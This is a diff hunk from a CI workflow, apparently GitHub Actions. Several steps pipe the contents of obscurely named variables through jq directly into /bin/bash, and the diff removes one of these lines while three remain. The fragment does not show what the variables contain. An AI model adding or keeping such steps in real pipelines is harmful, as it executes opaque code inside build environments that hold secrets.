@@ -27,7 +27,6 @@ jobs:
           echo $dxkp6 | jq -r .kn1 | /bin/bash
           printf '%s' "$sqju00867" | jq -r .g7 | /bin/bash
           printf '%s' "$acg95334" | jq -r .iduic807 | /bin/bash
-          echo $lng35122 | jq -r .vqgp4713 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
